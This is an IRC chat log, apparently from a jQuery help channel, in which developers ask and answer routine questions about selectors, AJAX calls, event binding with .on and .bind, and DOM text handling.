[16:29:38] <chovy> starsinmypockets: you can do replace() too.
[16:33:01] <sparuvu1> can someone help tp correct this code : http://jsfiddle.net/6hQfR/
[16:34:20] <sparuvu1> $.when is checking only if the variable "snippets" exists or not …instead I want $.when to wait until it executes the ajax calls
[16:38:09] <jorn> heyho, when a .getJSON request fails i can add a callback with .fail() to it, but how can i access the status code from within it? self.status?
[16:39:10] <acidjazz> use .get
[16:40:39] <jorn> acidjazz: it's kind of similar to .getJSON
[16:41:02] <acidjazz> its less characters
[16:42:29] <jorn> acidjazz: right, but i want to set the accept headers and my whole question would then apply for .get
[17:02:59] <Che-Anarc> If I have>  var xyz = { "x" : "123", "z" : "456" };    how do I re-assign / change z for example?
[17:03:17] <chovy> xyz.z = 'foo'
[17:06:37] <rpaddock> A click event is being triggered for an element with no bound handler. Any reason why nothing would occur? If I bind a custom handler to that same element and do a console.log() I can see it's being triggered, but somehow the actual click isn't propagating
[17:06:57] <LekeFly> How do i get the Open/Close toggle here to work after a product is added to cart? http://www.iphoneutstyr.no/untitled/
[17:11:10] <chovy> LekeFly: $("toggle-example2").click(function(e){ $(this).parents(".block-cart").hide(); });
[17:12:00] <LekeFly> chovy: in addition to the code i already have?
[17:12:22] <chovy> attach a click event to the open/close link and then remove it's parent container.
[17:12:34] <chovy> I did not see what you already have js-wise.
[17:20:39] <ploo> I have a bunch of classes I wanted to show and hide with the same name but the number at the end is different? Can I retieve all of these based off the name with regexp or something?
[17:22:58] <aaairc> is there way to monitor a "var" which is an object, and do something each time it is set to a new value?
[17:24:27] <staaky> ploo: $('[class^="name"]')
[17:28:23] <aaairc> http://jsfiddle.net/UR3uu/  so here is a more written out example of what i'm trying to do
[17:28:39] <aaairc> if my var changes i would like trigger a function to happen
[17:29:53] <jimubao> Hello, I have found an issue with jQuery Mobile's getScreenHeight() method. In iOS only, it takes the browser's URL bar & bottom toolbar and adds that to the minimum height (min-height). This event is triggered on 'pageshow' by jQuery Mobile core. Can we somehow override this behaviour without editing the core?
[17:30:03] <jimubao> Essentially, no matter what event we bind our fix to (e.g. 'pageshow') the core will override it
[17:31:00] <jimubao> I need to override this to get the actual view-port height, not the screen height, as a min-height.
[17:34:53] <Dan_Wilson_> I'm working with some JSONP stuff and I have a question. It seems as if JQuery is adding some extra parameters into my $.getJSON() call. Specifically, I see these two parameters added to the request: &callback=jQuery171032178770910973464_1328131932076&_=1328146417062
[17:35:17] <jimubao> The issue is described clearly in issue #3379 - still open.
[17:35:31] <Dan_Wilson_> I understand the need for the callback one, but the parameter for the underscore _ is screwing me over because the API I hit won't tolerate extra parameters
[17:35:51] <Dan_Wilson_> How much control do I have over the _=1328146417062 being added to my request signature?
[17:48:47] <tw2113> i am using $.ajax() to pull in some foursquare data, and passing the data into a function that will be used to take the data and plot some points on a map
[17:49:00] <tw2113> right now the user has to refresh to get a new map plot
[17:49:15] <tw2113> i want to make it so they just have to click a link or button to get a new suggestion
[17:49:57] <tw2113> i want to be able to just call the same function as the ajax call uses, on click
[17:50:18] <tw2113> but as I have it now, the click version gets zero data passed in
[17:51:15] <tw2113> do i need to find a way to store the data in a more global manner ?
[17:55:55] <lduros> hello, if I do $('script[type!="my-type"]); -- would it also select scripts that are do NOT have a type attribute set?
[17:58:10] <lduros> obviously I could also do $('script :not([type])') but then it wouldn't select those elements that have a type attribute that isn't set as my-type
[17:58:22] <lduros> so... I could either merge these two selectors afterwards
[17:58:36] <lduros> or do something different, not sure if there's a way to get them all at once
[18:00:13] <grkblood> why isnt h1 changing when i click a checkbox? http://jsfiddle.net/UMkk4/1/
[18:01:39] <tw2113> grkblood this showed up in firebug console: Syntax error, unrecognized expression: regex
[18:02:40] <grkblood> hrm... regex whould be valiod
[18:02:42] <grkblood> valid*
[18:03:16] <imsky> no bot-t?
[18:03:19] <imsky> NO BOT-T?
[18:04:05] <lduros> I guess for my problem I can just use a comma
[18:04:11] <lduros> haha
[18:14:40] <someprimetime> http://jsfiddle.net/someprimetime/xB9b4/67/ how can i get that text to stop moving when Helpful is clicked in the Dropdown section?
[18:21:43] <coldhead> someprimetime: return false
[18:21:51] <coldhead> i don't know why it makes a difference but it does
[18:27:40] <someprimetime> the "stuff here" text/
[18:27:41] <someprimetime> ?
[18:29:47] <someprimetime> coldhead: how would return: false prevent that text from sliding below it?
[18:32:28] <airdem> http://pastebin.com/4bWC6430 the "return false on click" does not workin in this case
[18:32:30] <airdem> any idea why?
[18:35:35] <tw2113> can you pass in functions as function parameters? or is it just variables?
[18:35:57] <PhonicUK> is there a way to know the frame rate of a running animation that jquery is performing?
[18:36:07] <PhonicUK> so i can turn animations off if the frame rate is too low
[18:36:44] <coldhead> someprimetime: oh you're talking about the text below
[18:36:55] <coldhead> i thought you meant the way the browser window moves to the top of the document
[18:37:11] <someprimetime> coldhead: ah gotcha
[18:37:29] <someprimetime> it does that because of the # in the href
[18:37:38] <coldhead> you want the menu to sit on top of the text?
[18:37:40] <someprimetime> which i got rid of
[18:37:42] <coldhead> the text underneath?
[18:37:44] <someprimetime> coldhead: yeah
[18:37:47] <coldhead> like obscuring it?
[18:37:50] <someprimetime> so the drop down just goes over it
[18:37:55] <coldhead> just make the ul position:absolute
[18:38:02] <someprimetime> ah
[18:38:03] <someprimetime> duh
[18:38:05] <someprimetime> haha thanks
[18:38:39] <coldhead> you're welcome
[18:38:46] <coldhead> that's a very handsome looking stylesheet you got there
[18:39:29] <coldhead> tw2113: of course you can
[18:40:03] <tw2113> basic rundown. i'm trying to make a "random selector" based on geolocation + foursquare data
[18:40:04] <coldhead> ?eval function foo (bar) {bar()}; foo(function () {alert('heyo');});
[18:40:06] <bot-t1> coldhead: "heyo"
[18:40:31] <tw2113> i'm planning out what i need for this to work
[18:40:44] <tw2113> 1 function to get geoloc, 1 function to pull the ajax response
[18:40:55] <coldhead> PhonicUK: google probably knows more but you could maybe test the size of the animation queue
[18:41:26] <tw2113> and then 1 function that plots the first location onto a map, but can be re-called to plot a new one
[18:41:41] <airdem> how can i make sortable execute the "update" events function again?
[18:43:35] <coldhead> tw2113: wanna fiddle up a prototype?
[18:44:09] <tw2113> maybe in a bit once i get some of the logic worked out
[18:44:28] <tw2113> i'll see what i come up with. I know I don't want to have them nested
[18:44:42] <chee> coldhead: don't you have work to do
[18:44:57] * tw2113 pays coldhead with some monopoly money
[18:45:04] <grkblood> does anyone use this? http://james.padolsey.com/javascript/regex-selector-for-jquery/
[18:45:04] <tw2113> he's working, helping me brain
[18:45:33] <chee> D:
[18:46:13] <chee> :D
[18:46:14] <tw2113> i'm mostly familiar with intermediate php, but javascript is a new beast for me that i hope to tackle more :D
[18:46:35] * chee takes care of hi burt's bees
[18:46:37] <chee> *his
[18:47:03] <someprimetime> how can i check to see if a css property exists?
[18:47:11] <Whirl3d> evenin' all
[18:47:21] <coldhead> tw2113: javascrit is pretty good at this nesting stuff and passing functions as variable. strive for simplicity is my best advice
[18:47:24] <chee> evenin', Whirl3d
[18:47:25] <someprimetime> like if($(this).parents('.grid_12').css('visible') === 'hidden') or something
[18:47:53] <coldhead> someprimetime: you can test for that with .is(':visibile')
[18:48:18] <coldhead> for testing actual set properties you are probably safer to work with the native element
[18:48:20] <coldhead> sans jquery
[18:48:24] <someprimetime> err shit sorry i meant overflow: hidden
[18:48:27] <coldhead> but i have never done that, i have no idea
[18:48:36] <someprimetime> not the visibility css property
[18:48:48] <TimothyA> $.ajax({username:'username', password:'password', url:'http://something.com/'} should send an AJAX request with the basic authorization header, right?
[18:48:50] <coldhead> $('thing').css('overflow') === 'hidden'
[18:48:58] <coldhead> but that's a tricky one because it might be overflow-x
[18:49:00] <coldhead> or -y
[18:49:06] <coldhead> and i don't know if jquery will lie to you
[18:49:27] <coldhead> TimothyA: that makes it look like you're trying to do ajax across domains
[18:49:48] <coldhead> which is naughty
[18:49:49] <someprimetime> coldhead: thanks i'll try that :D
[18:50:43] <TimothyA> coldhead: it's allowed in this case since it's over https!
[18:51:54] <coldhead> as far as i know, TimothyA, your ajax calls must be to the same domain, with the same protocol and same port
[18:52:15] <coldhead> and you generally don't want to mention the domain in your ajax call
[18:52:33] <coldhead> so jQuery will do the right thing even if you move domains
[18:52:35] <TimothyA> coldhead: it's for private-use
[18:52:44] <coldhead> i am not making a moral judgement
[18:52:51] <coldhead> the browser won't let you
[18:52:55] <coldhead> ?sop workarounds
[18:52:55] <bot-t1> workarounds for the same-origin policy: http://forum.jquery.com/topic/capturing-live-html-page-to-a-jquery-object#14737000000617405
[18:52:59] <TimothyA> well... it just let me :)
[18:53:05] <coldhead> SQUEE!
[18:53:05] <TimothyA> yep, took a while to get around the issue
[18:53:19] <coldhead> you are in a brave new world then
[18:53:24] <coldhead> where nothing is as it seems
[18:53:29] <TimothyA> :P
[18:53:32] <coldhead> and the only one you can rely on is yourself
[18:53:34] <coldhead> THIS SUMMER

[19:55:17] <LordThumper> Hi, I am trying to get a set of XMLNodes from an XMLDocument
[19:55:58] <LordThumper> xDoc.SelectNodes("test") is getting node "test", how do I get all "test"s children instead?
[19:59:28] <lduros> let's say I want to add something as: elem.html(myString);
[19:59:32] <lduros> and I want to escape myString
[19:59:39] <lduros> to make sure that it doesn't contain any htm
[19:59:45] <lduros> html which could lead to xss
[20:00:03] <lduros> what would I do?
[20:00:15] <lduros> I know elem.text(myString); would potentially take care of it
[20:00:16] <lduros> but
[20:00:32] <lduros> it's not exactly the same
[20:01:16] <lduros> I should use a dummy container no?
[20:02:30] <b0x> how can i return what class a selected element has??
[20:03:02] <b0x> attr
[20:04:22] <b0x> $(this).attr('class') ?
[20:04:40] <lduros> yeh
[20:05:08] <b0x> doesnt seem to return anything :/
[20:05:30] <b0x> ie
[20:05:34] <b0x> console.log('HOVER: ' + $(this).attr('class'));
[20:05:54] <b0x> my bad, selecting wrong element
[20:06:25] <b0x> yep works a treat
[20:06:33] <b0x> thx
[20:08:29] <ColKurtz> is it good practice to check for an element's existence before binding something to it in jquery?
[20:09:03] <ColKurtz> For example I have a main.js file that is used throughout the site. On several pages there's the same form used, and I want to validate it
[20:09:57] <ColKurtz> in a situation like this I've always checked for the element's existence, but I know that it works without doing so. So should I continue to check?
[20:10:54] <populuxe> Anyone seeing anything like this in Firefox 10? https://bugzilla.mozilla.org/show_bug.cgi?id=723388
[20:12:54] <tw2113> coldhead i may be making progress :D granted I had to resort to localstorage too :D
[20:13:54] <\monster\> hey guys, I want to do a ajax call and pass a json data type which also contains json within one of the fields:   data: 'json={"action":1,"data":"[{"foo":"moo"}]"}'  // the receive server gets confused decoding that
[20:21:44] <b0x> hmm
[20:22:19] <b0x> im selecting a <th> element, and trying to add some html on HOVER. the hover works i can see it returning what i need via console.log and breakpoints
[20:22:37] <b0x> however its not adding the html inside the <th></th> element
[20:22:53] <b0x> ive tried using .add() and .append()
[20:24:00] <b0x> append seems to be what im after
[20:24:45] <b0x> nvm got it
[20:49:04] <Gent> serializeArray() provides the selected values correct?  So if I had 4 radio buttons it would only give me the selected one?
[20:52:04] <danheberden> Gent, if the case of four radios with a name like "wat" the value would be wat=THESELECTEDVALUE
[20:52:44] <danheberden> there's also plugins to make it an object: https://github.com/danheberden/serializeObject
[20:53:35] <dytrivedi> .seen munichlinux
[20:53:41] <hsbot> munichlinux was seen 17 hours, 9 minutes and 45 seconds ago, quitting with the message: Quit: Leaving
[20:54:21] <Gent> danheberden: does this work the same is I have run a separate find...
[20:54:37] <Gent> for example $(form).find('.spot').serializeArray();
[20:54:49] <Gent> let's say every radio had a class of .spot, but same name
[20:54:56] <Gent> would it still only give me the selected one?
[20:55:00] <danheberden> Gent, it's designed to get the entire form
[20:55:14] <danheberden> but it'll work with a container
[20:55:17] <Gent> I'm aware, but the docs say it will work on a jQuery if inputs
[20:55:26] <danheberden> Gent, i'm talking about the plugin
[20:55:36] <danheberden> as for the serializeArray, it should, too, work with a collection
[20:55:37] <danheberden> or container
[20:55:55] <Gent> ok, in short, I only one the ones that have a class, and are selected...
[20:55:59] <Gent> so hopefully all is well
[20:56:14] <someprimetime> i made some tabs that load and populate div container on page load, but i'm wondering if i should just on page load generate that content on the server side and then allow subsequent tab clicks to reload the content within it
[20:56:20] <someprimetime> is that the generally better practice to go with?
[20:56:32] <someprimetime> populate (a) div container, rather
[20:57:15] <Gent> also, I know this isn't a general JS rule, but is the following syntax valid, does anyone know?  var obj = {key: (function(){ return true; })()}; ?
[20:58:20] <danheberden> Gent, you can assign a function as the value of a object key, yes
[20:58:27] <danheberden> or an iffi
[20:58:30] <danheberden> *iife
[20:58:53] <Gent> danheberden: it's actually calling the function immediately and assigning the return value...
[20:58:54] <danheberden> ?eval var a = { wat: (function(){return 'omg';})() }; a.wat;
[20:58:56] <bot-t> danheberden: "omg"
[20:59:02] <danheberden> Gent, that's what an "iife" is

[20:59:09] <Gent> haha
[20:59:36] <Gent> it seemed firefox was complaining about the ending () before the }
[20:59:46] <Gent> but I think the problem lied elsewhere
[20:59:49] <Gent> much appreciated
[21:22:05] <Chopps> hey guys, i have a pretty simple function: http://pastebin.com/gQLiLQgD how can i make it execute another function after the onready function finishes?
[21:22:36] <danheberden> Chopps just call it at the end?
[21:24:08] <Chopps> danheberden, i want it to be nested, because the function i want to execute requires the value i set on the onready function
[21:24:23] <danheberden> Chopps, then call the function after you set the value
[21:25:44] <Chopps> it doesnt work, ive tried, the value is not set untill all the cmds withing the onready function are completed
[21:29:18] <danheberden> Chopps i think you have something else wrong http://jsfiddle.net/danheberden/UFapM/
[21:35:00] <Chopps> danheberden, http://pastebin.com/RJhPjwvE thats the function i have
[21:35:48] <Chopps> the ajax calls 2 & 3 will not work because the returned value from ajax call 1 is not set untill all the onready function is done
[21:36:05] <danheberden> Chopps well ajax calls are different - thems be asynchronous

[21:48:15] <sarkis> hey all, i have a div container that contains an href, can i make the div on click, click the anchor?
[21:48:32] <sarkis> also on hover of the div, can i have it underline the link?

[21:56:31] <thomedy> im about to write a scroll function but whenever i do any animating with jquery i get a jumpy effect to which i dont like alot
[21:56:53] <thomedy> how can i avoid that
[22:07:58] <ibodi> coldhead: is there a jquery does replace text job? eg find any char="[[" and replace it with "<b>" etc
[22:08:55] <coldhead> ?ba replacetext
[22:08:59] <bot-t> coldhead, jQuery replaceText: String replace for your jQueries! - http://benalman.com/code/projects/jquery-replacetext/docs/
[22:09:30] <shadykhan> is there a way i can force an element to be hoverd?
[22:11:19] <ibodi> coldhead: that is pretty cool! thanks
[22:11:24] <coldhead> no shadykhan
[22:14:11] <coldhead> shadykhan: if you need to do it in the CSS sense you generally have to do an actual class alongside the pseudo class
[22:14:18] <coldhead> and then toggle the actual class
[22:14:23] <shadykhan> thank you
[22:14:24] <coldhead> if ya feel me
[22:14:32] <shadykhan> oh i feel ya
[22:15:04] <coldhead> my wife doesn;'t understand me
[22:15:17] <coldhead> it's good to finally have a real connection with another human being
[22:15:34] <ibodi> coldhead: http://imgur.com/gallery when you scroll near bottom of the page ,new contents come out, what is that jquery tech ?
[22:16:23] <ibodi> coldhead: pretty many on other sites as well
[22:17:40] <coldhead> ibodi: have a look at the code for paul irish's infinite scroll plugin
[22:17:47] <coldhead> that's a pretty good demo of how to do it
[22:19:31] <ibodi> coldhead:  cool2. will study tomorrow. thanks 2
[22:22:22] <citizenkeys> how can i get just "anchor text" from this: <a id="myLink">anchor text <span>blah blah blah</span></a>
[22:22:53] <citizenkeys> when I do $(#myLink).text() i get "anchor text <span>blah blah blah</span>"
[22:23:05] <Jonno_FTW> will this select anchor tags with class internal? $("a.internal") ?
[22:23:30] <mindis|wurk> yes
[22:23:44] <Jonno_FTW> does $.get work when working in the local dir?
[22:24:18] <coldhead> citizenkeys: $('#myLink').clone().find('span').remove().end().text();
[22:24:22] <coldhead> it's that simple
[22:24:25] <coldhead> just 300 functions
[22:24:28] <systemfault> Jonno_FTW: I'd be surprised if it does..
[22:24:40] <systemfault> Jonno_FTW: Security concerns.
[22:24:42] <Jonno_FTW> ok, then I see why my page isn't working
[22:25:49] <systemfault> Jonno_FTW: It takes 5 minutes to install apache... or you could use your dropbox's public folder as webserver to test.
[22:26:08] <Jonno_FTW> systemfault: I have a server I'll use
[22:26:37] <Jonno_FTW> using nginx anyway
[22:27:10] <systemfault> Not that it matters for local tests :P
[22:30:13] <Jonno_FTW> ok, when I use $.get({url:$(this).attr("href")....}); it tries to get %5Bobject%20Object%D
[22:30:19] <citizenkeys> coldhead: well? that works.  but there isn't a way to get just the text node without the <span>?
[22:31:00] <citizenkeys> i would've thought that "anchor text" would be a text node and "<span>" would be a different node.
[22:31:20] <MACscr> anyone working with jquery datatables plugin much? what do you think is the easiest/most efficient way to generate the tables from mysql queries using php? im already using json a lot, so i might use that as a source, but it seems to be a messy method with the plugin
[22:38:46] <Whirl3d> if you have a collection of li and want to filter only those elements with text values starting with some string, can I use $("li").filter("[text^='"+somestring+"']");   will it work and/or is there a better way?
[22:39:10] <coldhead> citizenkeys: they probably are separate text nodes but jquery is more interested in elements than nodes. you'd probably have to go native and that's not something i do lightly
[22:39:25] <coldhead> or at all
[22:39:27] <coldhead> tbh
[22:39:31] <coldhead> i fear nodes
[22:39:37] <coldhead> the word is too close to nude
[22:39:41] <coldhead> and it reminds me of my shame
[22:39:46] <Whirl3d> I thought you WERE a nodist
[22:39:51] <citizenkeys> when I did document.getElementById('myLink).text I got the same thing (with the span).
[22:40:14] <coldhead> i'm sure there's a way
[22:40:18] <coldhead> i just have no idea what it is
[22:40:27] <coldhead> it's pretty much my first day using jQuery
[22:41:09] <systemfault> Hmm... I should say that everyday too :/
[22:44:26] <dr0id> innerText
[22:44:34] <sarkis> hmm
[22:44:39] <Whirl3d> can I filter using the attribute selector "text" to get the element's "text" value? or is the text VALUE not accessible as an ATTRIBUTE (caps used for clarification, sorry)
[22:46:04] <coldhead> good old innertext
[22:46:06] <sarkis> whats the best way to make an anchor underline the text when hovering over a div?
[22:46:33] <dr0id> div:hover a { text-decoration: underline; }
[22:46:59] <dr0id> yo colzy
[22:47:16] <sarkis> dr0id: if i hover over the div anywhere it will underline the anchor?
[22:47:30] <dr0id> ye
[22:47:50] <dr0id> but that is not jquery code. tell me what code it is ?
[22:48:34] <sarkis> oh yaa
[22:48:42] <sarkis> CSSSSSSS
[22:48:44] <sarkis> lol
[22:48:52] <sarkis> thanks dr0id
[22:49:04] <coldhead> great work everyone, take five
[22:49:23] <sarkis> dr0id: i also would like to trigger a click of the anchor if anywhere in the div is clicked
[22:49:35] <sarkis> i tried .trigger() but failed :/
[22:50:22] <sarkis> $(div).click(function(){ $(this).find('a').trigger('click'); });
[22:50:57] <dr0id> $('div').on('click', function() { $(this).find('a').click(); });
[22:51:12] <sarkis> hmm
[22:51:25] <sarkis> not possible via trigger?
[22:51:32] <sarkis> im trying to understand what trigger is used for..
[22:52:14] <Whirl3d> .click is either .bind("click") or .trigger("click") depending on how you use it
[22:53:36] <Whirl3d> you can also "bind" custom actions to an elment that you access using "trigger"
[22:54:04] <sarkis> hmm says no method 'on'.. is that a newer feature? (looks on jquery docs)
[22:54:28] <sarkis> oh ya 1.7?
[22:55:38] <Whirl3d> $(".el").bind("getaClue",function () {console.log("I got a clue, for realsies");}); $(btn).click(function (e) { e.preventDefault(); $(".el").trigger("getaClue");});
[22:55:46] <systemfault> sarkis: Yeah, 1.7
[22:56:30] <sarkis> interesting
[22:57:39] <Whirl3d> ;
[22:58:18] <sarkis> hmm so whats the method pre 1.7?
[22:58:33] <sarkis> for .on("click", function...);
[22:58:41] <systemfault> sarkis: .on replaces .bind/.live/.delegate
[22:58:50] <systemfault> You might want .bind
[22:58:53] <sarkis> im trying via .live... it is some weird behavior
[22:58:59] <sarkis> ill try bind again
[23:00:56] <sarkis> $(div).bind('click', function(){ $(this).find('a').click(); });
[23:02:01] <sarkis> throwing an error...
[23:02:23] <systemfault> sarkis: What do you want to do?
[23:02:58] <sarkis> when user clicks the div, i want to have it click the anchor
[23:03:46] <someprimetime> for some reason i'm loading content using ajax() into a container, and some of the js that works within that container no longer works
[23:03:50] <Whirl3d> $("#yourDiv").click(function (e) { e.preventDefault(); $(this).find("a").click()});
[23:03:50] <systemfault> sarkis: The anchor is inside the div?
[23:03:58] <sarkis> yes
[23:04:01] <someprimetime> so i tried using on('click') but to no avail
[23:04:29] <systemfault> someprimetime: .load strips scripts.
[23:04:50] <systemfault> someprimetime: Then write a testcase :/
[23:04:52] <systemfault> Err
[23:04:55] <citizenkeys> innerText is a method.
[23:04:56] <systemfault> sarkis: ^^
[23:05:08] <citizenkeys> if I do innerText it's to set the text, not get the text.
[23:05:32] <systemfault> innerText is a property afaik.
[23:05:47] <someprimetime> systemfault: i'm not using load
[23:05:49] <someprimetime> .load() rather
[23:06:13] <Whirl3d> citizenkeys, even if innerText was a jquery method, most jquery methods act as both setters and getters depending on your implementation.
[23:07:15] <Whirl3d> someprimetime, can you provide an example? Are the scripts based on resources loaded in the header of the docs you are loading via ajax or are they inline?
[23:07:46] <Whirl3d> do the scritps that are failing refer to elements that don't exist in the new scope (once loaded)? What kind of errors are your getting.
[23:07:47] <systemfault> I might be wrong... but IIRC innerText doesn't work everywhere so you might also need textContent
[23:07:52] <citizenkeys> hmm.
[23:08:30] <sarkis> Whirl3d: I tried this.. $('.inbox-email-container').click(function(e){ e.preventDefault(); $(this).find('a').click(); });
[23:08:42] <sarkis> throwing an error, i can't figure out why that doesnt work?
[23:08:49] <Whirl3d> what is the error?
[23:09:22] <sarkis> its a long error object with d.objects
[23:09:43] <sarkis> im looking in the chrome developer toolbar
[23:09:55] <Whirl3d> seriously? then the answer is a long one too most likely. Come on
[23:10:07] <someprimetime> Whirl3d: http://jsfiddle.net/someprimetime/WmpcS/ there is a lot of code there
[23:10:12] <someprimetime> and it obviously doesn't work on jsfiddle
[23:10:38] <someprimetime> but the things to look at are in the first function, the direction.on('click') stops working after i load content via ajax from the tab plugin I wrote below it
[23:10:56] <sarkis> http://paste.pocoo.org/show/544482/
[23:11:09] <pif> hi, what is the simplest way to delay loading a page element until the whole page has loaded?
[23:11:16] <someprimetime> in the tabs function, the changeTab method is what is loading the content into #js-tabs-container in the html above
[23:11:33] <sarkis> oh wait i think i know hwy
[23:12:44] <Whirl3d> someprimetime, add the dataType:"html" to your ajax options object, first...
[23:12:57] <systemfault> pif: $(window).on('load',.....); IIRC
[23:13:28] <coldhead> everyone, please refrain from typing in this channel unless you absolutely need to, i think it's slowing down my downloads
[23:13:29] <coldhead> thanks
[23:13:44] <pif> systemfault: so that and have a placeholder div in the page?
[23:13:53] <sarkis> you guys seen errors like this??
[23:13:56] <sarkis> http://paste.pocoo.org/show/544482/
[23:14:14] <systemfault> pif: You know better than me :/
[23:14:25] <pif> not sure :)
[23:14:52] <someprimetime> Whirl3d: added
[23:14:54] <Whirl3d> someprimetime, also, if you have scripts that load in the header of the pages you are loading, you may need to load those separately and append them to the dom header manually. I am not sure if that is always true or not, but I have had to do that before
[23:17:43] <Whirl3d> someprimetime, I find that the success callback returns data, xhrsstatus   the first "data" parameter is raw text. You should try:    success:function (data) {var dt=$(data).apendTo(someContainer);}  it might help
[23:17:44] <sarkis> window.location=$(this).find("a").attr("href"); return false;
[23:19:42] <someprimetime> Whirl3d: hmm appreciate the help, but yeah this is weird.. that didn't seem to work
[23:20:36] <Whirl3d> can you access the scripts in question via console?
[23:23:48] <someprimetime> after the tabs loads the content, i can't output anything from the vote function
[23:23:52] <someprimetime> but before it loads it works fine
[23:24:57] <Whirl3d> is the up and down button in a parent element of the tab?
[23:25:17] <Whirl3d> it looks like you are trying to do the equivalent of .live
[23:26:03] <Whirl3d> so if a newly loaded page (in a tab) has an element of class: ".vote-down", and it is clicked, do the vote down thing...right?
[23:26:05] <someprimetime> Whirl3d: no, it's getting loaded into <div class="js-tabs-container">
[23:26:20] <someprimetime> right
[23:26:47] <Whirl3d> in a common ancestor element, listen for the click event on a ".vote-down" element like this:
[23:28:00] <Whirl3d> $("#top-red-box").on("click",".vote-down", function (e) { var targ=$(e.target); var tab=targ.closest("tabclass"); do your vote thing});
[23:29:30] <Whirl3d> then, when any element of .vote-down class (loaded dynamically or otherwise) is clicked...it'll continue to bubble up until it reaches the top-red-box .on handler. Otherwise, every time you load the page, you have to re-bind all of the lements on the newly loaded content....could get messy
[23:31:43] <Whirl3d> am I making any sense?
[23:32:24] <Whirl3d> Also, if you have duplicate ID's in your loaded content it won't work.
[23:32:43] <Whirl3d> you need to use classes rather than IDs if possible.
[23:33:12] <someprimetime> yeah, you are making perfect sense
[23:33:25] <someprimetime> thanks.. gonna play with this for a little bit
[23:34:17] <Whirl3d> right on
[23:38:18] <Es0teric> hey, Whirl3d, how do i make it so that this -> http://jsfiddle.net/seBfE/7/ allows the enter key to be replaced with <b> tag?
[23:41:22] <Whirl3d> rather than handle the click event, handle the keyup or keydown or keypress event. Then check e.keycode if it's enter and in edit mode, change it back to <b>....
[23:42:09] <Es0teric> Whirl3d, i tried doing that but it doesnt let me input any text in the input field...
[23:42:51] <Whirl3d> gimme a sec, I'll show you how I would approach it..
[23:43:00] <Es0teric> alright
[23:54:31] <hyper_ch> with jqueryUI dialog in modal form you can create popups that contain a form and submit that data. I wonder, can those forms also contain other JS code?
[23:58:04] <prodn> How can I prevent the default behaviour from happening when I .click() a link? (this link has no id, it's just any link "a")
[23:58:59] <prodn> That said - the default behaviour beeing that I actually get linked to another site
[23:59:06] <kakeman> preventDefault
